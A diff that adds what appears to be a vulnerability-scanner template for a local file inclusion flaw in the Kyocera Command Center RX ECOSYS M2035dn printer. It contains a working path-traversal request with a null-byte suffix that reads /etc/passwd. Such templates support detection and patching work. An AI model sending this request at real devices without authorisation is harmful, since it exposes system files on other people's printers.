@@ -1,0 +1,22 @@
+id: kyocera-m2035dn-lfi
+brief:
+    title: Kyocera Command Center RX ECOSYS M2035dn - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Kyocera Command Center RX ECOSYS M2035dn is vulnerable to unauthenticated local file inclusion.
+    label:
+        - edb
+        - printer
+        - iot
+        - kyocera
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg'
+      signs:
+        - "on": status
+          status:
+            - 200
